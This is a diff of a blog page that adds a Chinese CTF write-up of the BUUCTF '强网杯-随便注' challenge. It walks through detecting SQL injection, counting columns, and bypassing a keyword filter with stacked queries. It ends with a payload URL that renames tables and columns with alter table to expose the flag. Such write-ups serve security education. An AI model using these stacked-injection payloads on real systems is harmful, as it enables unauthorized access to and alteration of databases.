@@ -4,11 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUUCTF admin, L">
-    <meta name="description" content="
-        document.querySelectorAll(&#39;.github-emoji&#39;)
-          .forEach(el =&gt; {
-            if (!el.dataset.src) { return">
+    <meta name="keywords" content="BUUCTF 强网杯-随便注, L">
+    <meta name="description" content="打开环境，看到这样的页面
+
+加’引号测试报错加注释恢复正常，所以可以判断是单引号的注入
+之后开始判断列数order by测试到3的时候报错所以一共有两列判断完列数，开始union注入，但回显告诉我们过滤了很多关键字之后尝试了许多方法想要绕过">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +16,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>BUUCTF admin | L</title>
+    <title>BUUCTF 强网杯-随便注 | L</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -307,12 +307,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BUUCTF admin</h1>
+                    <h1 class="description center-align post-title">BUUCTF 强网杯-随便注</h1>
                 </div>
             </div>
         </div>
@@ -427,12 +427,33 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/LawlietLW.github.io/tags/Web/">
+                                <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="/LawlietLW.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">堆叠注入</span>
+                            </a>
+                        
+                            <a href="/LawlietLW.github.io/tags/%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97/">
+                                <span class="chip bg-color">修改表名和列</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -441,7 +462,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-01-23
+                    2019-12-21
                 </div>
                 
 
@@ -455,7 +476,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    52
+                    462
                 </div>
                 
 
@@ -478,7 +499,20 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <script>
+                <p>打开环境，看到这样的页面<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/1.jpg" alt=""></p>
+<a id="more"></a>
+<p>加’引号测试<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/2.jpg" alt=""><br>报错<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/3.jpg" alt=""><br>加注释<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/4.jpg" alt=""><br>恢复正常，所以可以判断是单引号的注入</p>
+<p>之后开始判断列数<br>order by测试到3的时候报错<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/5.jpg" alt=""><br>所以一共有两列<br>判断完列数，开始union注入，但回显告诉我们过滤了很多关键字<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/6.jpg" alt=""><br>之后尝试了许多方法想要绕过，但都没有什么效果<br>然后就是学到的新东西了，堆叠注入<br>首先用show databases;爆库<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/7.jpg" alt=""><br>然后show tables;报表<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/8.jpg" alt=""><br>可以看到一共有两个表<br>words和1919810931114514<br>然后查询words表里所有的列</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span></code></pre>
+<p><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/9.jpg" alt=""><br>words表里一共两列，id和data，结合我们用1查询出来的结果，也是一个序号一个字符串，所以基本确定我们当前所在的表就是words表<br>再查询1919810931114514表的列</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token punctuation">(</span>纯数字需要用反引号括起来<span class="token punctuation">)</span></code></pre>
+<p><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/10.jpg" alt=""><br>可以看到这个表里面有我们需要的flag<br>那么该如何获取flag呢</p>
+<p>我们可以将words表改成另外一个名字，然后将1919810931114514表改为words，这样的话，我们只需要查询words表就能得到flag<br>payload如下</p>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//417fcd6d-dfd6-4e25-a790-5178dd3c699b.node3.buuoj.cn/?inject=1%27;alter table words rename to word;alter table `1919810931114514` rename to words;alter table words change flag data varchar(100);alter table words add column id int(10)--+</span></code></pre>
+<p>注：这里要注意几个问题：</p>
+<pre><code>对列名进行更改时，要在后面指定修改后的数据类型
+添加id列时，设置默认值，方便后面查询</code></pre><p>执行完payload后，然后再查询1’ and ‘1’=’1就可以得到flag<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/11.jpg" alt=""></p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -521,7 +555,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://LawlietLW.github.io/LawlietLW.github.io/2020/01/23/buuctf-admin/">http://LawlietLW.github.io/LawlietLW.github.io/2020/01/23/buuctf-admin/</a>
+                    <a href="http://LawlietLW.github.io/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/">http://LawlietLW.github.io/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -558,7 +592,19 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/LawlietLW.github.io/tags/Web/">
+                                    <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="/LawlietLW.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">堆叠注入</span>
+                                </a>
+                            
+                                <a href="/LawlietLW.github.io/tags/%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97/">
+                                    <span class="chip bg-color">修改表名和列</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -722,74 +768,38 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
-            <div class="card">
-                <a href="/LawlietLW.github.io/2020/01/23/buuctf-admin/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="BUUCTF admin">
-                        
-                        <span class="card-title">BUUCTF admin</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-23
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            LawlietLW
-                            
-                        </span>
-                    </div>
-                </div>
-
-                
-            </div>
-        </div>
-        
-        
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/LawlietLW.github.io/2020/01/23/buuctf-rip/">
+                <a href="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="BUUCTF rip">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="BUUCTF easy_tornado">
                         
-                        <span class="card-title">BUUCTF rip</span>
+                        <span class="card-title">BUUCTF easy_tornado</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return
+                            打开环境
+
+有三个页面，挨个访问看看
+/flag.txt
+
+/welcome.txt
+
+/hints.txt
+开始分析第一个页面告诉我们flag in /fllllllllllllaghint告诉我们
+md5(cookie_secret+m
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-23
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-12-21
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -805,16 +815,73 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/LawlietLW.github.io/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
+                    <a href="/LawlietLW.github.io/tags/Web/">
+                        <span class="chip bg-color">Web</span>
                     </a>
                     
-                    <a href="/LawlietLW.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                        <span class="chip bg-color">栈溢出</span>
+                    <a href="/LawlietLW.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">模板注入</span>
                     </a>
                     
-                    <a href="/LawlietLW.github.io/tags/rip/">
-                        <span class="chip bg-color">rip</span>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
+            </div>
+            <div class="card">
+                <a href="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="BUUCTF 强网杯-随便注">
+                        
+                        <span class="card-title">BUUCTF 强网杯-随便注</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            打开环境，看到这样的页面
+
+加’引号测试报错加注释恢复正常，所以可以判断是单引号的注入
+之后开始判断列数order by测试到3的时候报错所以一共有两列判断完列数，开始union注入，但回显告诉我们过滤了很多关键字之后尝试了许多方法想要绕过
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/LawlietLW.github.io/tags/Web/">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/LawlietLW.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">堆叠注入</span>
+                    </a>
+                    
+                    <a href="/LawlietLW.github.io/tags/%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97/">
+                        <span class="chip bg-color">修改表名和列</span>
                     </a>
                     
                 </div>
@@ -965,7 +1032,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">104</span>&nbsp;字
+                class="white-color">3.2k</span>&nbsp;字
             
             
             
